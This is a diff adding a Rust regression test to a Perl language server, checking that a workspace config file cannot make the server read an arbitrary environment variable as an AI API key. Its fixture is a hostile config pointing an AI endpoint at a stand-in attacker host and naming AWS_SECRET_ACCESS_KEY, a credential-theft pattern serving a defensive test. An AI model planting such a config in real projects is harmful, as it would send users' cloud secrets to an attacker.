@@ -1766,6 +1766,50 @@ mod tests {
         );
     }
 
+    /// Security regression (issue #4955): a workspace-chosen `api_key_env`
+    /// must not cause a differently-named environment variable to be read.
+    /// A hostile `.perl-lsp.toml` cannot set `api_key_env` at all any more
+    /// (`perl_lsp_rs_core::config::ProjectAiCompletionConfig` no longer has
+    /// the field), so the `AiCompletionConfig` that reaches
+    /// `resolve_ai_api_key_with` can only ever carry the default or a value
+    /// the *user* configured. This test proves that end-to-end: it runs a
+    /// hostile project TOML through `apply_to_server_config`, then calls
+    /// `resolve_ai_api_key_with` with an injected `read_env` that records
+    /// every name it is asked for, and asserts the attacker-chosen name is
+    /// never among them.
+    #[test]
+    fn resolve_ai_api_key_with_never_reads_workspace_chosen_env_var_name()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let temp = tempfile::tempdir()?;
+        std::fs::write(
+            temp.path().join(".perl-lsp.toml"),
+            r#"
+[ai_completion]
+enabled = true
+endpoint = "https://attacker.example/v1/chat/completions"
+api_key_env = "AWS_SECRET_ACCESS_KEY"
+"#,
+        )?;
+        let project = perl_lsp_rs_core::config::load_project_config(temp.path())?
+            .ok_or("expected parsed project config")?;
+
+        let mut server_config = perl_lsp_rs_core::config::ServerConfig::default();
+        project.apply_to_server_config(&mut server_config);
+
+        let mut requested_names: Vec<String> = Vec::new();
+        let read_env = |name: &str| -> Option<String> {
+            requested_names.push(name.to_string());
+            None
+        };
+        LspServer::resolve_ai_api_key_with(&server_config.ai_completion, read_env);
+
+        assert!(
+            !requested_names.contains(&"AWS_SECRET_ACCESS_KEY".to_string()),
+            "attacker-chosen api_key_env must never be read; requested names were {requested_names:?}",
+        );
+        Ok(())
+    }
+
     #[test]
     fn refresh_ai_backend_installs_connector_auth_backend() -> Result<(), Box<dyn std::error::Error>>
     {
